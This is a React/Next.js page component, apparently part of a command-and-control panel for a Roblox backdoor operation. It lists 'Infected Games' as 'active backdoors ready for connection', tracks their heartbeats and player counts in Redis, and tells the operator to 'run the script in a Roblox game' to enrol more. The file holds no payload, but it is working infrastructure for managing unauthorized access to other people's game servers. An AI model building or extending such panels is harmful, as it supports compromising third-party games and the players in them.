import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { getActiveGames, getRedisStatus, getHiddenGameIds } from "@/lib/redis"
import { GameCard } from "@/components/game-card"
import { Gamepad2, Users, Database } from "lucide-react"
import { getSession } from "@/lib/auth"
import { prisma } from "@/lib/prisma"
import { ReloadButton } from "@/components/reload-button"

export const dynamic = 'force-dynamic'

export default async function GamesPage() {
    const session = await getSession();
    let isShadowBanned = false;
    if (session?.userId) {
        const user = await prisma.user.findUnique({ where: { id: session.userId }, select: { isShadowBanned: true } });
        isShadowBanned = !!user?.isShadowBanned;
    }

    // Get active games from Redis (games with recent ping and players > 0)
    let games = await getActiveGames(4); // 2 minute threshold

    // Get DB status
    const isDbAlive = await getRedisStatus();

    // Filter hidden games
    const hiddenIds = await getHiddenGameIds();
    games = games.filter(g => !hiddenIds.has(g.gameId));

    if (isShadowBanned) {
        games = [];
    }

    // Sort by player count (biggest to smallest)
    games.sort((a, b) => b.playerCount - a.playerCount);

    const totalPlayers = games.reduce((acc, game) => acc + game.playerCount, 0);
    const totalGames = games.length;

    return (
        <div className="space-y-8 h-full flex flex-col">
            <div className="flex items-center justify-between">
                <div className="flex flex-col gap-2">
                    <h2 className="text-4xl font-extrabold tracking-tight bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
                        Infected Games
                    </h2>
                    <p className="text-lg text-muted-foreground">
                        Active backdoors ready for connection.
                    </p>
                </div>
                <ReloadButton />
            </div>

            {/* Statistics Cards */}
            <div className="grid gap-4 md:grid-cols-3">
                <Card className="bg-black/40 border-white/10 backdrop-blur-md">
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                        <CardTitle className="text-sm font-medium text-muted-foreground">
                            Total Players
                        </CardTitle>
                        <Users className="h-4 w-4 text-cyber" />
                    </CardHeader>
                    <CardContent>
                        <div className="text-2xl font-bold text-white">{totalPlayers.toLocaleString()}</div>
                        <p className="text-xs text-muted-foreground">
                            Across {totalGames} active games
                        </p>
                    </CardContent>
                </Card>
                <Card className="bg-black/40 border-white/10 backdrop-blur-md">
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                        <CardTitle className="text-sm font-medium text-muted-foreground">
                            Active Games
                        </CardTitle>
                        <Gamepad2 className="h-4 w-4 text-green-400" />
                    </CardHeader>
                    <CardContent>
                        <div className="text-2xl font-bold text-white">{totalGames}</div>
                        <p className="text-xs text-muted-foreground">
                            Currently sending heartbeats
                        </p>
                    </CardContent>
                </Card>
                <Card className="bg-black/40 border-white/10 backdrop-blur-md">
                    <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                        <CardTitle className="text-sm font-medium text-muted-foreground">
                            Database Status
                        </CardTitle>
                        <Database className="h-4 w-4 text-blue-400" />
                    </CardHeader>
                    <CardContent>
                        <div className="text-2xl font-bold text-white">
                            {isDbAlive ? "Alive" : "Offline"}
                        </div>
                        <p className="text-xs text-muted-foreground">
                            Redis Connection
                        </p>
                    </CardContent>
                </Card>
            </div>

            {games.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-20 text-center space-y-4 border border-dashed border-white/10 rounded-2xl bg-white/5">
                    <div className="p-4 rounded-full bg-white/5">
                        <Gamepad2 className="h-10 w-10 text-muted-foreground" />
                    </div>
                    <div className="space-y-1">
                        <h3 className="text-xl font-semibold">No Active Games</h3>
                        <p className="text-muted-foreground max-w-sm">
                            No infected games detected. Run the script in a Roblox game to see it here.
                        </p>
                    </div>
                </div>
            ) : (
                <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
                    {games.map((game) => (
                        <GameCard key={game.id} game={game} />
                    ))}
                </div>
            )}
        </div>
    )
}
